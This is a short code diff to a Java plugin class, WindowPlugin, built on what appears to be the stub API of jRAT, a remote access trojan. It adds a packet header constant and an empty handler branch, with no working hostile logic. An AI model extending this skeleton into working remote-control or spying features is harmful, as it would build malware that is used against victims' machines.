@@ -6,6 +6,8 @@ import java.io.DataOutputStream;
 import jrat.api.stub.StubPlugin;
 
 public class WindowPlugin extends StubPlugin {
+	
+	public static final byte HEADER_LIST = -127;
 
 	@Override
 	public void onStart() throws Exception {
@@ -24,7 +26,9 @@ public class WindowPlugin extends StubPlugin {
 
 	@Override
 	public void onPacket(byte header) throws Exception {
-		
+		if (header == HEADER_LIST) {
+			
+		}
 	}
 
 	@Override
